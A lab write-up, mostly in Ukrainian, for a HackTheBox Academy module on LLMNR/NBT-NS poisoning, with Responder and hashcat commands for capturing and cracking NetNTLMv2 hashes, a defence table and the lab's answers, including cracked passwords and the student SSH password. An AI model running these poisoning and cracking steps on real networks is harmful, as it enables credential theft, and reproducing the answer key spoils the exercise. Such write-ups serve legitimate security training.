# LLMNR/NBT-NS Poisoning - from Linux

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1272](https://academy.hackthebox.com/app/module/143/section/1272) |

---

## 🧠 Теорія

**LLMNR** (Link-Local Multicast Name Resolution) та **NBT-NS** (NetBIOS Name Service) — запасні механізми name resolution у Windows, коли DNS не відповідає.

**Атака:**
1. Жертва намагається знайти хост (`\\printer01`) → DNS не знає → broadcasts LLMNR/NBT-NS запит
2. Responder відповідає першим: "Це я, printer01!"
3. Жертва надсилає автентифікацію → ми отримуємо **NetNTLMv2 hash**
4. Hash крекаємо офлайн → cleartext password → foothold

> ⚠️ NetNTLMv2 **не можна** використовувати для Pass-the-Hash — тільки крекінг або SMB Relay

---

## 🔧 Інструменти

| Інструмент | Платформа | Опис |
|------------|-----------|------|
| **Responder** | Linux (Python) | LLMNR/NBT-NS/MDNS poisoner |
| **Inveigh** | Windows (C# / PS) | Аналог Responder для Windows |
| **Metasploit** | Cross | Вбудовані сканери та poisoning модулі |

**Протоколи, які підтримує Responder:**
`LLMNR · DNS · MDNS · NBNS · DHCP · ICMP · HTTP · HTTPS · SMB · LDAP · WebDAV · Proxy Auth · MSSQL · DCE-RPC · FTP · POP3 · IMAP · SMTP`

---

## 🔑 Ключові команди

### Responder — основні прапори

```bash
# Довідка
responder -h

# Пасивний режим (тільки слухати, не отруювати)
sudo responder -I ens224 -A

# Активний режим (отруювати + захоплювати хеші)
sudo responder -I ens224

# З WPAD проксі та fingerprinting
sudo responder -I ens224 -wf
```

> 💡 Запускати у `tmux` — Responder слухає у фоні, поки виконуємо інше

**Необхідні відкриті порти на attack host:**
```
UDP 137, 138, 53    TCP 80, 135, 139, 445
UDP/TCP 389         TCP 1433, 3141, 21, 25
Multicast UDP 5355, 5353
```

---

### Перевірка захоплених хешів

```bash
# Логи зберігаються тут:
ls /usr/share/responder/logs/

# Формат файлів:
# SMB-NTLMv2-SSP-172.16.5.25.txt
# HTTP-NTLMv2-172.16.5.200.txt

# Переглянути захоплений хеш
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.25.txt
```

---

### Hashcat — крекінг NTLMv2 хешу

```bash
# Скопіювати хеш у файл
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.*.txt > hashes.txt

# Крекінг (режим 5600 = NetNTLMv2)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Якщо вже є правила
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Показати тільки результати (без прогресу)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

**Hashcat режими для NTLM:**

| Mode | Hash Type |
|------|-----------|
| `5600` | NetNTLMv2 (Responder output) |
| `5500` | NetNTLMv1 |
| `1000` | NTLM (від secretsdump) |

---

### Повний workflow (крок за кроком)

```bash
# 1. SSH до attack host
ssh htb-student@<TARGET_IP>
# pass: HTB_@cademy_stdnt!

# 2. Запустити Responder у tmux (залишити у фоні)
tmux new -s responder
sudo responder -I ens224
# Ctrl+B, D — відключитись від tmux (Responder продовжує працювати)

# 3. Почекати 5-10 хвилин — хеші з'являться автоматично

# 4. Повернутись у tmux і перевірити логи
tmux attach -t responder
ls /usr/share/responder/logs/

# 5. Скопіювати хеш у файл і зламати
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
  /usr/share/wordlists/rockyou.txt
```

---

## 🛡️ Захист (для Blue Team)

| Захід | Опис |
|-------|------|
| Вимкнути LLMNR | GPO: Computer Config → Admin Templates → Network → DNS Client → "Turn off multicast name resolution" |
| Вимкнути NBT-NS | Network Adapter → TCP/IP → Advanced → WINS → "Disable NetBIOS over TCP/IP" |
| Увімкнути SMB Signing | Усуває SMB Relay атаки |
| Network Access Control | Контроль того, хто може підключитись до мережі |
| Strong Passwords | Складні паролі важче (або неможливо) зламати |

---

## ❓ Questions

### Q1 — Акаунт на літеру "b"

> **Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.**

**Steps:**

```bash
# SSH до attack host
ssh htb-student@<TARGET_IP>   # pass: HTB_@cademy_stdnt!

# Запустити Responder
sudo responder -I ens224

# Чекати поки з'явиться хеш від акаунта на "b"
# У виводі буде рядок типу:
# [SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
```

**Answer:** `backupagent`

---

### Q2 — Cleartext пароль backupagent

> **Crack the hash for the previous account and submit the cleartext password as your answer.**

**Steps:**

```bash
# Зберегти хеш у файл
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt | grep -i "backupagent" > hash_backupagent.txt

# Зламати hashcat
hashcat -m 5600 hash_backupagent.txt /usr/share/wordlists/rockyou.txt
```

**Answer:** `h1backup55`

---

### Q3 — Пароль користувача wley

> **Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.**

**Steps:**

```bash
# Responder вже запущений з попередніх кроків
# Чекати хеш від wley — він з'явиться автоматично

# Зберегти та зламати
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt | grep -i "wley" > hash_wley.txt
hashcat -m 5600 hash_wley.txt /usr/share/wordlists/rockyou.txt
```

**Answer:** `transporter@4`

---
